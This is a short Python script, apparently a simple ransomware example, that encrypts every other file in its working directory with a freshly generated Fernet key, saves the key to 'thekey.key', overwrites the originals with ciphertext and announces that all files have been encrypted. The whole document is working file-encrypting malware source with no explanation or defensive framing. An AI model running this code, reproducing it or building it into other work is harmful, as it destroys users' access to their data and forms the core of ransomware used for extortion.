import os
from cryptography.fernet import Fernet

files = []

for file in os.listdir():
    if file == "kriptonite.py" or file == "thekey.key" or file == "dekryptonite.py":
        continue
    if os.path.isfile(file):
        files.append(file)

key = Fernet.generate_key()

with open("thekey.key", "wb") as key_file:
    key_file.write(key)

for file in files:
    with open(file, "rb") as file_object:
        file_data = file_object.read()

    fernet = Fernet(key)
    encrypted_data = fernet.encrypt(file_data)

    with open(file, "wb") as file_object:
        file_object.write(encrypted_data)

print(f"All of your files have been encrypted.\nHere is a list of thoes files: {files}")